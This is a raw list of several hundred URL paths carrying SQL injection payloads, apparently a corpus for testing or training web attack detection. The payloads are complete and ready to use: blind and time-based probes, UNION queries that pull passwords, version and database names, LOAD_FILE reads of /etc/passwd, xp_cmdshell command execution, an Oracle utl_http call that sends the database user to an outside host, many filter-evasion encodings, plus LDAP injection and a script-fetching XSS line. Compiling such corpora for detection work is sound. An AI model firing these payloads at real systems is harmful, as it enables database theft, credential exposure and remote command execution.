 /path0/path1/path2/path3/?payload=x' AND 1=(SELECT COUNT(*) FROM tabname);--
-
 /path0/?payload=1+union+select+abc+from+abc
-
 /path0/path1/path2/path3/?payload='union select 1,load_file(0x2f6574632f706173737764),3 from users--
-
 /path0/?payload=0^(locate(0x61,(select id from users where num=1),1)=1)
-
 /path0/path1/path2/?payload=x';INSERT+INTO+aa('1')+values('1')--
-
 /path0/path1/path2/path3/?payload=x';UPDATE+aa+set+1='2'--
-
 /path0/path1/path2/?payload=a';exec+master..xp_cmdshell+'ping'--
-
 /path0/?payload='1+or+1=1--
-
 /path0/path1/path2/path3/?payload='1+or+'ab'='ab1
-
 /path0/?payload='+and+@@version>1--
-
 /path0/path1/?payload=1'+HAVING 1=1--
-
 /path0/path1/?payload=%20union%20/*!select*/%20/*!@@datadir*/
-
 /path0/path1/path2/path3/?payload=1'+and+(select+pass+from+users+limit+1)='pass--
-
 /path0/path1/path2/?payload=123+uniOn+SeLEcT+BaNneR+FroM+v$vERsIon+WhERe+ROwNUm=1
-
 /path0/path1/path2/?payload=10+UNION+SELECT+LOAD_FILE(0x2f6574632f706173737764)
-
 /path0/path1/?payload='+and+(select+substr(group_concat(pass),1,1)+from+users)='a
-
 /path0/path1/?payload=1%27%20union%20select%201,2,3--
-
 /?payload=1++union++select++abc++from++abc
-
 /?payload=1%20%20union%20%20select%20%20abc%20%20from%20%20abc
-
 /path0/path1/path2/?payload=1%20%20%20%20union%20%20%20%20select%20%20%20%20abc%20%20%20%20from%20%20%20%20abc
-
 /path0/path1/?payload=1/*union*/union/*select*/select+1,2,3/*
-
 /path0/path1/path2/?payload=1%2520union%2520select%25201,2,3/*
-
 /path0/?payload=1%0Aunion%0Aselect%0A1,2,3/*
-
 /path0/path1/?payload=1'OR'121'='121
-
 /path0/path1/?payload=1'%0Cand%0C''='
-
 /path0/path1/path2/?payload=1'%0Cunion%0Cselect%0C1,2,3
-
 /path0/path1/path2/path3/?payload=1'%0Band%0B''='
-
 /path0/path1/path2/?payload=1'%0Bunion%0Bselect%0B1,2,3
-
 /path0/path1/?payload=1'%0Dand%0D''='
-
 /path0/path1/path2/path3/?payload=1'%0Dunion%0Dselect%0D1,2,3
-
 /path0/path1/path2/path3/?payload=union(select(version()))
-
 /path0/path1/?payload=123/*!or*/1=1;
-
 /path0/path1/?payload=1'union/*!select*/pass,load_file(0x11)from+users--
-
 /path0/?payload=1 and 9=8 /*!uNiOn*/ aLl /*!sElect*/ 1,2,3--
-
 /path0/?payload=1/**/union%a0select/**/1,pass,3`a`from`users`
-
 /path0/?payload=1+union+select+1,2,3/*
-
 /?payload=1+union+select+1,2,3--
-
 /path0/?payload=1+union+select+1,2,3# 
-
 /path0/path1/path2/?payload=1+union+select+1,2,3;%00
-
 /path0/path1/path2/path3/?payload=SET @c = CONCAT(b'01010011',b'01100101',b'01001100',b'01100101',b'01100011',b'01110100',' ',b'00110001');PREPARE s FROM @c;EXECUTE s;
-
 /?payload=SET @c = CONCAT(_latin1 b'01010011',_latin1 b'01100101',_latin1 b'01001100',_latin1 b'01100101',_latin1 b'01100011',_latin1 b'01110100',' ',_latin1 b'00110001');PREPARE s FROM @c;EXECUTE s;
-
 /path0/path1/path2/?payload=SET @c = CONCAT(REPLACE(MAKE_SET(5,'SEL','xxxxx','ECT'), ',', ''),' 1');PREPARE s FROM @c;EXECUTE s;
-
 /path0/?payload=23%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6e75773a%2C%28CASE%20WHEN%20%286349=6349%2F%2A%2150521%20AND%206349=6350%2A%2F%29%20THEN%201%20ELSE%200%20END%29%2C0x3a6270793a%29%23
-
 /path0/?payload=23%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6e75773a%2CIFNULL%28CAST%28CURRENT_USER%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a6270793a%29%23
-
 /path0/path1/path2/path3/?payload=23%EF%BC%87%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a757a793a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736a763a%29%23
-
 /path0/path1/path2/path3/?payload=23%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a757a793a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736a763a%29%23%00
-
 /path0/path1/?payload=%27--iXhuMCk%0ALIMIT--MogMpTZGYi%0A1%2C1--TPjIJcnXAuX%0AUNION--llDCqlfYffk%0AALL--AtQHoRbN%0ASELECT--aaoghwWht%0ACONCAT%280x3a7372773a%2CIFNULL%28CAST%28database%28%29--nXGeXoOEyHm%0AAS--tWKPbn%0ACHAR%29%2C0x20%29%2C0x3a6d79643a%29%23
-
 /path0/path1/path2/path3/?payload=%31%32%33%27%20%4C%49%4D%49%54%20%31%2C%31%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%43%4F%4E%43%41%54%28%30%78%33%61%37%33%37%32%37%37%33%61%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%64%61%74%61%62%61%73%65%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%33%61%36%64%37%39%36%34%33%61%29%23
-
 /path0/path1/path2/?payload=23%27%23DDvIMgC%0ALIMIT%23wyQDiZxbEfWH%0A1%2C1%23vJHSbhW%0AUNION%23WfNzMdJBEP%0AALL%23AgDqJl%0ASELECT%23xRYClbEPoiuX%0ACONCAT%280x3a7372773a%2CIFNULL%28CAST%28version%28%29%23BiJwsArZs%0AAS%23FgnwSFSQ%0ACHAR%29%2C0x20%29%2C0x3a6d79643a%29%23
-
 /path0/path1/path2/?payload=23%29%20AND%20%28SELECT%205524%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6864723a%2C%28SELECT%20%28CASE%20WHEN%20%285524%20LIKE%205524%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a7767793a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287619%20LIKE%207619
-
 /path0/path1/path2/?payload=23%29%20AND%202874%20LIKE%202341%20AND%20%288194%20LIKE%208194
-
 /?payload=23%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6864723a%2CIF%28ISNULL%28CAST%28version%28%29%20AS%20CHAR%29%29%2C0x20%2CCAST%28version%28%29%20AS%20CHAR%29%29%2C0x3a7767793a%29%23
-
 /path0/path1/path2/?payload=23%29%20%20AND%20%20%20%208558=8593%20%20AND%20%20%20%20%285473=5473
-
 /path0/path1/?payload=223%29%20%20%20%20AND%20%20%20%20%208558=8593%20%20AND%20%20%20%20%20%20%285473=5473
-
 /path0/path1/path2/?payload=323%27%20%20AND%20%20%20%28%20%20SELECT%20%20%20%202937%20%20%20FROM%28%20%20SELECT%20%20%20%20%20COUNT%28%2A%29%2C%20%20CONCAT%280x3a6d70663a%2C%28%20%20SELECT%20%20%20%20MID%28%28%20%20IFNULL%28%20CAST%28%20%20database%28%29%20%20%20AS%20%20%20%20%20%20%20CHAR%20%20%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a736e623a%2CFLOOR%28RAND%280%29%2A2%29%29x%20%20%20%20FROM%20%20%20%20INFORMATION_SCHEMA.CHARACTER_SETS%20%20%20%20GROUP%20%20%20%20%20BY%20%20%20%20x%29a%29%20%20AND%20%20%20%27rmHN%27=%27rmHN
-
 /path0/path1/path2/?payload=423%27%20%20%20%20LIMIT%20%20%201%2C1%20%20UNION%20%20%20%20%20ALL%20%20%20%20%20%20%20SELECT%20%20%20%20%20CONCAT%280x3a6d70663a%2C%20IFNULL%28%20CAST%28%20%20database%28%29%20%20%20AS%20%20%20%20%20CHAR%20%29%2C0x20%29%2C0x3a736e623a%29%23
-
 /?payload=23%bf%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6d70663a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736e623a%29%23--%20
-
 /path0/path1/path2/path3/?payload=123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6d70663a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736e623a%29%23%20and%20%270having%27=%270having%27
-
 /?payload=223%29%20AND%201701=5451%20AND%20%283835=3835%20and%20%270having%27=%270having%27
-
 /path0/path1/?payload=23%27%23mPkKCjceC%0A%23pwsxOHFa%0ALIMIT%23GSTpANJXKGdC%0A%23uOaAVrPY%0A%23IufLHavTgnn%0A%23sRygbynG%0A1%2C1%23uRvizI%0A%23kNTIVAJnz%0AUNION%23IEVjNIbBGg%0A%23CrHaTy%0A%23PkPohIaUPUPP%0A%23ouAusiVKpxg%0A%23UTlHCuTls%0AALL%23ZdLRhsQPAkid%0A%23ObZxIruvjFbd%0A%23IxosRHsTC%0A%23lZlmVvV%0ASELECT%23FHaHzAMzvN%0A%23BWRjqHuR%0A%23BTtMGfzKairL%0A%23GvGSlRR%0A%23kbCsPv%0A%23kiirXiLzYG%0A%23RkKvrFrkKc%0ACONCAT%280x3a6267653a%2C%23TLxyzUYCN%0A%23iKDnXTOMyUX%0AIFNULL%28%23KLWKJH%0ACAST%28%23EVVXxVJ%0A%23ddeBcXdPJNK%0A%23JytbHTOvwXC%0Aversion%28%29%23OXQNXTG%0A%23JqAzVQn%0A%23uYcIYOA%0A%23xBATyw%0AAS%23SuQdAyf%0A%23hQHYtT%0A%23ReByaH%0A%23COkovdqzzcS%0A%23nJrotVbdX%0ACHAR%23NklnJgTSwC%0A%23StUlDCtwD%0A%23EHSUPhSgYLrO%0A%29%2C0x20%29%2C0x3a69626b3a%29%23%20and%20%270having%27=%270having%27
-
 /path0/path1/?payload=23%27%2BLIMIT%2B1%2C1%2BUNION%2BALL%2BSELECT%2BCONCAT%280x3a6267653a%2CIFNULL%28CAST%28version%28%29%2BAS%2BCHAR%29%2C0x20%29%2C0x3a69626b3a%29%23
-
 /path0/path1/?payload=-223%27%20%2F%2A%2130631LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6267653a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a69626b3a%29%2A%2F%2
-
 /path0/path1/path2/?payload=323%29%20%2F%2A%2100000AND%203244=4853%20AND%20%286013=6013%2A%2F
-
 /path0/?payload=423%27%20%2F%2A%2100000LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6a7a713a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a79757a3a%29%2A%2F%23
-
 /path0/path1/?payload=523%27%2F%2A%21LIMIT%2A%2F1%2C1%2F%2A%21UNION%2A%2F%2F%2A%21ALL%2A%2F%2F%2A%21SELECT%2A%2F%2F%2A%21CONCAT%2A%2F%280x3a6a7a713a%2C%2F%2A%21IFNULL%2A%2F%28CAST%28%2F%2A%21database%2A%2F%28%29%2F%2A%21AS%2A%2F%2F%2A%21CHAR%2A%2F%29%2C0x20%29%2C0x3a79757a3a%29%23
-
 /path0/path1/path2/?payload=123%27%09LIMIT%0C1%2C1%0AUNION%04ALL%01SELECT%07CONCAT%280x3a6a7a713a%2CIFNULL%28CAST%28database%28%29%09AS%0BCHAR%29%2C0x20%29%2C0x3a79757a3a%29%23
-
 /path0/path1/path2/path3/?payload=123%29%07AND%079869=8149%01AND%01%281045=1045
-
 /path0/path1/?payload=1+and+1=1
-
 /?payload=1+and+100>(ASCII(Substring(user(),1,1)))
-
 /path0/?payload=1+and+100>(Select+top+1+ASCII(Substring(name,1,1))) from sysusers)--
-
 /path0/path1/path2/?payload=1 and 100>(Select ASCII(Substr(username,1,1))) from all_users where rownum<=1)
-
 /?payload=1 and substring(version(),1,1)=4
-
 /?payload=+order+by+19--
-
 /path0/path1/?payload='1+and+'123'='123
-
 /path0/?payload=1'+or+@@servername=@@servername--
-
 /path0/path1/path2/?payload=1+and+ascii('a')=97
-
 /path0/?payload=1+and+hex('a')=61
-
 /?payload=1+and+ord('a') = 97
-
 /path0/path1/path2/?payload=1 and name=0x5265696E657273
-
 /path0/path1/?payload=1+and+length(123)=3
-
 /path0/?payload=123+AND+md5('a')!= md5('A')
-
 /path0/?payload=and (select 1)=1
-
 /path0/path1/path2/path3/?payload='+or+round(pi(),1)+true+true = version()
-
 /path0/path1/path2/?payload=+or+round(pi(),1)+true+true = version()
-
 /path0/?payload=1+and+ascii(lower(substring((select+pwd+from+users+limit+1,1),1,1))
-
 /path0/path1/path2/path3/?payload=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
-
 /path0/path1/path2/path3/?payload=123%20or%20%c0%a7%c01%a71=%c0%a71
-
 /path0/path1/path2/?payload=')+waitfor+delay+'0:0:5'
-
 /?payload=');waitfor+delay+'00:00:05'
-
 /path0/path1/path2/?payload=';waitfor+delay+'00:00:05'
-
 /path0/?payload=');waitfor+delay+'00:00:05'--
-
 /path0/path1/path2/path3/?payload=');waitFor+Delay+'00:00:05'
-
 /?payload='waitfor+delay+'00:00:05'
-
 /path0/?payload=')+waitfor+delay+'00:00:05'
-
 /path0/?payload='+waitfor+delay+'00:00:05'--
-
 /path0/path1/path2/?payload='+waitfor+delay+'00:00:05'
-
 /?payload=+waitfor+delay+'00:00:05'
-
 /path0/path1/path2/path3/?payload=';waitfor+delay+'0:0:5'--
-
 /path0/path1/path2/path3/?payload=BENCHMARK(1000000000,MD5(CHAR(116)))
-
 /?payload=' UNION SELECT IF(SUBSTRING(USER(),1,4)=0x726f6f74,BENCHMARK(100000000,RAND()),1)
-
 /path0/path1/path2/?payload=+if(ASCII(SUBSTRING((),i, 1))>k,BENCHMARK(100000000, RAND()),1)
-
 /?payload='%20AND%20SLEEP(10)='
-
 /path0/path1/?payload='||utl_inaddr.get_host_name((select+user+from+dual))
-
 /path0/path1/?payload='+or+1=utl_http.request('http://host/'||(select+user+from+dual))--
-
 /?payload=' or 1=1--  
-
 /path0/path1/?payload=' or 1=1#  
-
 /?payload=' or 1=1/*  
-
 /path0/path1/path2/?payload=') or '1'='1--  
-
 /path0/path1/?payload=' OR '1'='1' --
-
 /?payload=' OR '1'='1' /*
-
 /?payload=' OR '1'='1' #
-
 /path0/?payload=' OR '1'='1' %00
-
 /path0/?payload=' OR '1'='1' %16
-
 /?payload=OR 1=1
-
 /path0/path1/?payload=OR 1=0
-
 /path0/path1/path2/?payload=OR x=x
-
 /path0/path1/path2/path3/?payload=OR x=y
-
 /path0/?payload=OR 1=1#
-
 /path0/?payload=OR 1=0#
-
 /path0/path1/path2/?payload=OR x=x#
-
 /path0/?payload=OR x=y#
-
 /path0/path1/path2/?payload=OR 1=1-- 
-
 /?payload=OR 1=0-- 
-
 /path0/?payload=OR x=x-- 
-
 /path0/path1/?payload=OR x=y-- 
-
 /path0/?payload=OR 3409=3409 AND ('pytW' LIKE 'pytW
-
 /path0/path1/?payload=OR 3409=3409 AND ('pytW' LIKE 'pytY
-
 /?payload=HAVING 1=1
-
 /path0/path1/path2/?payload=HAVING 1=0
-
 /path0/?payload=HAVING 1=1#
-
 /?payload=HAVING 1=0#
-
 /?payload=HAVING 1=1-- 
-
 /path0/path1/?payload=HAVING 1=0-- 
-
 /path0/path1/path2/path3/?payload=AND 1=1
-
 /path0/path1/?payload=AND 1=0
-
 /?payload=AND 1=1-- 
-
 /path0/path1/path2/path3/?payload=AND 1=0-- 
-
 /path0/?payload=AND 1=1#
-
 /?payload=AND 1=0#
-
 /?payload=AND 1=1 AND '%'='
-
 /?payload=AND 1=0 AND '%'='
-
 /path0/path1/?payload=AND 1083=1083 AND (1427=1427
-
 /path0/path1/?payload=AND 7506=9091 AND (5913=5913
-
 /path0/path1/?payload=AND 1083=1083 AND ('1427=1427
-
 /?payload=AND 7506=9091 AND ('5913=5913
-
 /path0/path1/path2/?payload=AND 7300=7300 AND 'pKlZ'='pKlZ
-
 /path0/?payload=AND 7300=7300 AND 'pKlZ'='pKlY
-
 /path0/?payload=AND 7300=7300 AND ('pKlZ'='pKlZ
-
 /path0/path1/path2/?payload=AND 7300=7300 AND ('pKlZ'='pKlY
-
 /path0/?payload=AS INJECTX WHERE 1=1 AND 1=1
-
 /path0/path1/path2/?payload=AS INJECTX WHERE 1=1 AND 1=0
-
 /?payload=AS INJECTX WHERE 1=1 AND 1=1#
-
 /path0/path1/path2/?payload=AS INJECTX WHERE 1=1 AND 1=0#
-
 /?payload=AS INJECTX WHERE 1=1 AND 1=1--
-
 /path0/path1/?payload=AS INJECTX WHERE 1=1 AND 1=0--
-
 /path0/path1/path2/path3/?payload=WHERE 1=1 AND 1=1
-
 /path0/path1/?payload=WHERE 1=1 AND 1=0 
-
 /?payload=WHERE 1=1 AND 1=1#
-
 /?payload=WHERE 1=1 AND 1=0#
-
 /path0/?payload=WHERE 1=1 AND 1=1--
-
 /?payload=WHERE 1=1 AND 1=0--
-
 /path0/path1/path2/?payload=ORDER BY 1-- 
-
 /path0/path1/path2/?payload=ORDER BY 2-- 
-
 /path0/path1/path2/?payload=ORDER BY 3-- 
-
 /path0/path1/?payload=ORDER BY 4-- 
-
 /path0/?payload=ORDER BY 5-- 
-
 /?payload=ORDER BY 6-- 
-
 /path0/path1/?payload=ORDER BY 7-- 
-
 /path0/path1/path2/?payload=ORDER BY 8-- 
-
 /path0/?payload=ORDER BY 9-- 
-
 /path0/path1/path2/path3/?payload=ORDER BY 10-- 
-
 /path0/path1/path2/path3/?payload=ORDER BY 11-- 
-
 /path0/path1/path2/path3/?payload=ORDER BY 12-- 
-
 /?payload=ORDER BY 13-- 
-
 /path0/path1/?payload=ORDER BY 14-- 
-
 /path0/?payload=ORDER BY 15-- 
-
 /path0/path1/path2/path3/?payload=ORDER BY 16-- 
-
 /path0/path1/path2/path3/?payload=ORDER BY 17-- 
-
 /?payload=ORDER BY 18-- 
-
 /path0/?payload=ORDER BY 19-- 
-
 /path0/path1/path2/?payload=ORDER BY 20-- 
-
 /path0/path1/path2/path3/?payload=ORDER BY 21-- 
-
 /path0/?payload=ORDER BY 22-- 
-
 /?payload=ORDER BY 23-- 
-
 /path0/path1/path2/path3/?payload=ORDER BY 24-- 
-
 /path0/path1/?payload=ORDER BY 25-- 
-
 /path0/?payload=ORDER BY 26-- 
-
 /path0/?payload=ORDER BY 27-- 
-
 /path0/path1/path2/path3/?payload=ORDER BY 28-- 
-
 /?payload=ORDER BY 29-- 
-
 /?payload=ORDER BY 30-- 
-
 /path0/path1/path2/?payload=ORDER BY 31337-- 
-
 /path0/?payload=ORDER BY 1# 
-
 /?payload=ORDER BY 2# 
-
 /?payload=ORDER BY 3# 
-
 /path0/path1/?payload=ORDER BY 4# 
-
 /path0/?payload=ORDER BY 5# 
-
 /path0/?payload=ORDER BY 6# 
-
 /path0/path1/?payload=ORDER BY 7# 
-
 /path0/path1/path2/path3/?payload=ORDER BY 8# 
-
 /path0/?payload=ORDER BY 9# 
-
 /path0/path1/?payload=ORDER BY 10# 
-
 /path0/path1/?payload=ORDER BY 11# 
-
 /path0/path1/path2/path3/?payload=ORDER BY 12# 
-
 /path0/path1/path2/path3/?payload=ORDER BY 13# 
-
 /path0/path1/path2/?payload=ORDER BY 14# 
-
 /?payload=ORDER BY 15# 
-
 /path0/path1/?payload=ORDER BY 16# 
-
 /?payload=ORDER BY 17# 
-
 /?payload=ORDER BY 18# 
-
 /?payload=ORDER BY 19# 
-
 /path0/path1/path2/?payload=ORDER BY 20# 
-
 /path0/path1/path2/path3/?payload=ORDER BY 21# 
-
 /path0/path1/?payload=ORDER BY 22# 
-
 /?payload=ORDER BY 23# 
-
 /path0/path1/path2/path3/?payload=ORDER BY 24# 
-
 /path0/?payload=ORDER BY 25# 
-
 /path0/path1/?payload=ORDER BY 26# 
-
 /path0/?payload=ORDER BY 27# 
-
 /path0/path1/path2/?payload=ORDER BY 28# 
-
 /path0/path1/path2/?payload=ORDER BY 29# 
-
 /path0/path1/?payload=ORDER BY 30#
-
 /path0/path1/?payload=ORDER BY 31337#
-
 /path0/?payload=ORDER BY 1 
-
 /path0/path1/path2/?payload=ORDER BY 2 
-
 /path0/?payload=ORDER BY 3 
-
 /path0/path1/path2/?payload=ORDER BY 4 
-
 /?payload=ORDER BY 5 
-
 /path0/path1/path2/path3/?payload=ORDER BY 6 
-
 /path0/path1/?payload=ORDER BY 7 
-
 /path0/path1/path2/path3/?payload=ORDER BY 8 
-
 /path0/path1/path2/path3/?payload=ORDER BY 9 
-
 /path0/path1/?payload=ORDER BY 10 
-
 /path0/path1/path2/path3/?payload=ORDER BY 11 
-
 /?payload=ORDER BY 12 
-
 /?payload=ORDER BY 13 
-
 /?payload=ORDER BY 14 
-
 /path0/path1/path2/?payload=ORDER BY 15 
-
 /path0/path1/?payload=ORDER BY 16 
-
 /path0/path1/?payload=ORDER BY 17 
-
 /?payload=ORDER BY 18 
-
 /path0/path1/path2/?payload=ORDER BY 19  
-
 /path0/?payload=ORDER BY 20 
-
 /?payload=ORDER BY 21 
-
 /path0/path1/path2/?payload=ORDER BY 22 
-
 /path0/path1/?payload=ORDER BY 23 
-
 /?payload=ORDER BY 24 
-
 /path0/path1/?payload=ORDER BY 25 
-
 /?payload=ORDER BY 26 
-
 /path0/path1/?payload=ORDER BY 27 
-
 /path0/path1/path2/?payload=ORDER BY 28 
-
 /path0/path1/path2/path3/?payload=ORDER BY 29 
-
 /?payload=ORDER BY 30 
-
 /?payload=ORDER BY 31337 
-
 /path0/?payload=RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
-
 /?payload=RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
-
 /path0/path1/path2/?payload=%' AND 8310=8310 AND '%'='
-
 /path0/?payload=%' AND 8310=8311 AND '%'='
-
 /?payload=and (select substring(@@version,1,1))='X'
-
 /?payload=and (select substring(@@version,1,1))='M'
-
 /path0/path1/?payload=and (select substring(@@version,2,1))='i'
-
 /path0/path1/path2/?payload=and (select substring(@@version,2,1))='y'
-
 /?payload=and (select substring(@@version,3,1))='c'
-
 /?payload=and (select substring(@@version,3,1))='S'
-
 /path0/?payload=and (select substring(@@version,3,1))='X'
-
 /path0/path1/path2/?payload=~~)1(trela+tpircsavaj'.split('').reverse().join('').split('~').join(String.fromCharCode(47)).split('+').join(String.fromCharCode(58))).concat('
-
 /path0/path1/?payload=&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
-
 /phpmyadmin/documentation.html?'"=1
-
 /index.php?cid='
-
 /imp/mailbox.php3?actionid=6&server=x&imapuser=x';somesql+--&pass=x
-
 /cgi-bin/home/search.asp?nchannel='1
-
 /adodb/server.php?sql='adodb_sql_sql_injection.nasl
-
 /cgi-bin/index.php?act=arcade&do=stats&gameid=1'
-
 /cgi-bin/libraries/adodb/server.php?sql='adodb_sql_sql_injection.nasl
-
 /dagent/checkprofile.asp?agentid=11111'plus_agentid_sql_injection.nasl
-
 /path0/path1/path2/path3/?payload=TRUE
-
 /path0/path1/path2/?payload=FALSE
-
 /path0/path1/path2/path3/?payload=declare @s varchar (200) select @s = 0x73656c6 ...
-
 /path0/path1/path2/?payload=x' AND email IS NULL; --
-
 /path0/?payload=admin' or '
-
 /path0/path1/?payload=declare @s varchar(200) select @s = 0x77616974 ...
-
 /?payload=x' AND members.email IS NULL; --
-
 /path0/?payload= or (EXISTS)
-
 /path0/path1/path2/path3/?payload= or 'whatever' in ('whatever')
-
 /path0/path1/?payload=; begin declare @var varchar(8000) set @var=' ...
-
 /path0/?payload=declare @s varchar(22) select @s =
-
 /path0/path1/path2/path3/?payload=a'
-
 /path0/path1/?payload=" or isNULL(1/0) /*
-
 /path0/path1/path2/?payload=declare @s varchar (8000) select @s = 0x73656c ...
-
 /path0/path1/?payload= or username like char(37);
-
 /path0/path1/path2/path3/?payload=x' AND userid IS NULL; --
-
 /path0/path1/path2/path3/?payload= or 'text' > 't'
-
 /path0/?payload= (select top 1
-
 /path0/path1/?payload=uni/**/on sel/**/ect
-
 /?payload=declare @q nvarchar (200) select @q = 0x770061 ...
-
 /path0/?payload=declare @q nvarchar (4000) select @q =
-
 /path0/path1/path2/path3/?payload=||'6
-
 /path0/path1/path2/path3/?payload=password:*/=1--
-
 /?payload=x' OR full_name LIKE '%Bob%
-
 /path0/?payload=select versionnumber, version_timestamp from sysibm.sysversions;
-
 /path0/path1/path2/?payload=select current server from sysibm.sysdummy1;
-
 /path0/path1/?payload=select name, tbname, coltype from sysibm.syscolumns;
-
 /path0/path1/path2/path3/?payload='+(SELECT 1)+'
-
 /path0/path1/path2/?payload='+(SELECT 999999)+'
-
 /path0/path1/path2/path3/?payload=' select dbms_xmlgen.getxml('select \"a\" from sys.dual') from sys.dual;
-
 /path0/path1/path2/path3/?payload=' select+dbms_pipe.receive_message((chr(95)||chr(96)||chr(97))+from+dual)
-
 /?payload=or username LIKE '%a%
-
 /path0/?payload=' or username LIKE '%a%",
-
 /path0/path1/path2/path3/?payload='a' || 'b' 
-
 /path0/path1/?payload=' SELECT IF(1=1,'true','false')
-
 /path0/path1/path2/?payload=x' AND userid IS NULL; -- 
-
 /?payload=x' AND email IS NULL; -- 
-
 /path0/path1/path2/path3/?payload=x' AND members.email IS NULL; -- 
-
 /path0/path1/path2/path3/?payload='+and+@@servername>1--
-
 /path0/path1/path2/?payload=15+/*!union*/+/*!all*/+/*!select*/+1,2,3,4,5,6,7--
-
 /?payload=6+/*!UniOn*/+/*!AlL*/+/*!SeLecT*/+1,2,3,4,5,6,version()--
-
 /path0/?payload=nion/*aaa*/select/*aaa*/1,2,3
-
 /path0/?payload=1'&&1='1
-
 /path0/path1/path2/?payload='='
-
 /?payload=123%2527%2520select%2520convert(int,@@servername)--
-
 /path0/path1/?payload=1+and+len(@@servername)>1--
-
 /path0/path1/path2/path3/?payload=123'+not+like+'1234
-
 /path0/path1/?payload='aaa'<>'bbb'
-
 /path0/path1/?payload='+where+(0)=0
-
 /path0/path1/path2/?payload=+where 0 = 0
-
 /path0/?payload=case when name=0x5265696E657273 then 1 else 0 end
-
 /path0/path1/?payload=123+1+5-5-1
-
 /path0/path1/path2/?payload=123+len(1234)-len(123)
-
 /path0/?payload=23+len(@@servername)-len(@@servername)
-
 /path0/?payload=')+waitfor+time+'00:00:01'
-
 /path0/path1/?payload=admin' --  
-
 /path0/?payload=admin' #  
-
 /?payload=admin'/*  
-
 /path0/path1/?payload=IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
-
 /path0/path1/path2/path3/?payload=IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
-
 /path0/path1/path2/path3/?payload=admin)(|(password=*)
-
 /path0/path1/path2/?payload=admin)(%0a|(password=*)
-
 /path0/?payload='<=>0# 
-
 /?payload='!=2!=3!=4# 
-
 /path0/path1/path2/path3/?payload='|0# 
-
 /path0/path1/path2/path3/?payload='&0# 
-
 /?payload='^0# 
-
 /path0/path1/path2/path3/?payload=(coalesce(length(load_file(0x2F6574632F706173737764)),1))
-
 /path0/?payload=(1)rlike(if(mid(@@version,1,1)like(5),0x28,1))
-
 /path0/path1/path2/path3/?payload=1),(version(),1,1
-
 /path0/path1/path2/?payload=53E%4c%45%43T%20%73%63h%65%6d%61%6ea%6de%20%46%52O%4d%20%70g%5f%74a%62%6ce%73
-
 /path0/?payload=1+len(@@servername)>1/*
-
 /path0/path1/?payload=1+len(@@servername)>1--
-
 /path0/?payload=1+len(@@servername)>1# 
-
 /path0/path1/?payload=1+len(@@servername)>1;%00
-
 /path0/path1/path2/path3/?payload='; EXECUTE IMMEDIATE  'SEL' || 'ECT US' || 'ER'
-
 /?payload=MTIzJyBMSU1JVCAxLDEgVU5JT04gQUxMIFNFTEVDVCBDT05DQVQoMHgzYTc1N2E3OTNhLElGTlVMTChDQVNUKHZlcnNpb24oKSBBUyBDSEFSKSwweDIwKSwweDNhNzM2YTc2M2EpIw==
-
 /path0/path1/path2/path3/?payload=1%1%3%%27%+%A%N%D%+%1%=%1
-
 /path0/?payload=-123%27%2F%2A%210LIMIT%201%2C1%2F%2A%210UNION%2F%2A%210ALL%2F%2A%210SELECT%2F%2A%210CONCAT%280x3a6267653a%2C%2F%2A%210IFNULL%28CAST%28%2F%2A%210version%28%29%2F%2A%210AS%2F%2A%210CHAR%29%2C0x20%29%2C0x3a69626b3a%29%23
-
 /?payload=admin --
-
 /path0/path1/path2/?payload=1+and+convert(int,@@servername)--
-
 /?payload=admin'/*
-
 /path0/path1/path2/path3/?payload=admin'# 
-
 /path0/path1/?payload=1'<99# 
-
 /path0/path1/path2/?payload='=0=1# 
-
 /?payload=or isNULL(1/0) /*
-
 /path0/path1/?payload=@var select @var as var into temp end --
-
 /cgi-bin/detail.asp?nchannel='1
-
 /manager/phpnews/sendtofriend.php?mid='1'
-
 /scripts/detail.asp?nchannel='1
-
 /cacti/shopaddtocart.asp?productid='42
-
 /examples/jsp/jsp2/jspx/index.php?cat='
-
 /examples/jsp/sessions/index.php?act=arcade&do=stats&gameid=1'
-
 /scripts/jgs_portal_statistik.php?meinaction=themen&month=1&year=1'
-
 /recordings/shopexd.asp?catalogid='42
-
 /examples/jsp/checkbox/shopexd.asp?catalogid='42
-
 /phpmyadmin/shopexd.asp?catalogid='42
-
